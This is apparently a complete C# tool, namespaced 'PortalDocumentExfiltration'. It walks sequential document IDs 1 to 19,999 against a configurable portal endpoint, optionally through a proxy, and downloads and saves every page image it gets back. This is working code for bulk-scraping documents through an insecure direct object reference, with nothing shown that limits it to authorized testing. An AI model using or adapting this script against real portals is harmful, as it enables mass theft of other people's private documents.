using Microsoft.Extensions.Configuration;
using Newtonsoft.Json;
using System.Net;
#nullable disable

namespace PortalDocumentExfiltration
{
    public class PageDto
    {
        public string FileContents { get; set; }
        public string ContentType { get; set; }
    }

    internal class Program
    {
        private static string PagesEndpoint;
        private static HttpClient Client;

        static async Task Main(string[] args)
        {
            var config = new ConfigurationBuilder()
                .AddJsonFile("appsettings.json", true)
                .AddUserSecrets<Program>()
                .AddEnvironmentVariables()
                .Build();

            PagesEndpoint = config["PagesEndpoint"];
            if (PagesEndpoint is null) throw new ArgumentNullException(nameof(PagesEndpoint), "Missing value for pages endpoint");

            var folder = Path.Combine(Environment.CurrentDirectory, "PortalDocuments");
            Directory.CreateDirectory(folder);

            var proxyHost = config["ProxyHost"];
            var proxyPort = Convert.ToInt32(config["ProxyPort"]);
            if (proxyHost is not null && proxyPort is not 0)
            {
                var proxy = new WebProxy(proxyHost, proxyPort);
                proxy.UseDefaultCredentials = true;
                var handler = new HttpClientHandler()
                {
                    Proxy = proxy,
                };
                Client = new HttpClient(handler);
            }
            else
            {
                Client = new HttpClient();
            }

            var failCount = 0;

            var documentIDs = new List<int>();
            for (var i = 1; i < 20000; i++)
                documentIDs.Add(i);

            await documentIDs.ForEachAsync(i => GetAndSavePagesAsync(i, folder), (i, success) =>
            {
                if (success is false)
                {
                    failCount++;
                }
                UpdateConsole(failCount, i);
            });
        }

        private static SemaphoreSlim ConsoleLock = new(1, 1);

        private static void UpdateConsole(int failCount, int documentID)
        {
            if (ConsoleLock.CurrentCount > 0 is false) return;
            try
            {
                ConsoleLock.Wait();
                Console.Clear();
                Console.WriteLine($"Fail Count: {failCount}");
                Console.WriteLine($"DocumentID: {documentID}");
            }
            finally
            {
                ConsoleLock.Release();
            }
            
        }

        private static async Task<bool> GetAndSavePagesAsync(int documentID, string folderToSaveIn)
        {
            var dtos = await GetPagesAsync(documentID);
            await SavePages(dtos, folderToSaveIn, documentID);
            return dtos.Any();
        }

        private static async Task<List<PageDto>> GetPagesAsync(int documentID)
        {
            try
            {
                using var request = new HttpRequestMessage(HttpMethod.Get, PagesEndpoint + documentID);
                using var response = await Client.SendAsync(request);

                if (response.Content.Headers.ContentLength > 0 is false || response.StatusCode is not HttpStatusCode.OK)
                    return new List<PageDto>();

                var str = await response.Content.ReadAsStringAsync();
                return JsonConvert.DeserializeObject<List<PageDto>>(str)!;
            }
            catch (Exception ex)
            {
                var e = ex;
                throw;
            }
        }

        private static async Task SavePages(List<PageDto> pageDtos, string folderToSaveIn, int documentID)
        {
            var documentPage = 0;
            foreach (var pageDto in pageDtos)
            {
                var ext = pageDto.ContentType?.Split("/").LastOrDefault() ?? "webp";
                var filePath = Path.Combine(folderToSaveIn, $"{documentID}_{documentPage}.{ext}");
                var imageData = await Task.Run(() => Convert.FromBase64String(pageDto.FileContents));
                await File.WriteAllBytesAsync(filePath, imageData);
                documentPage++;
            }
        }
    }
}